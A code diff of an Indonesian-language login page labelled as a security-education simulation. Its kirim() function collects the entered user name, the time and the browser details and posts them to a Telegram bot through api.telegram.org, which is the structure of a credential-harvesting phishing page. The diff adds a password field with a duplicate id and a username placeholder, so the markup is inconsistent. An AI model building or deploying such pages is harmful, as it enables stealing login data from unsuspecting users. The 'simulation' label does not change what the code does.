@@ -106,7 +106,8 @@
   
   <input type="text" id="user" placeholder="Email / Username (Simulasi)" required>
 <input type="password" id="user" placeholder="Email / Username (Simulasi)" required>
-  <button onclick="kirim()">Masuk</button>
+
+      <button onclick="kirim()">Masuk</button>
 
   <div class="note">
     ⚠️ Ini hanya simulasi edukasi keamanan
@@ -129,7 +130,7 @@ function kirim() {
 👤 User: ${user}
 🕒 Waktu: ${new Date().toLocaleString()}
 🌐 Browser: ${navigator.userAgent}
-📘 password
+📘 Tanpa password (aman)`;
 
   fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
     method: "POST",
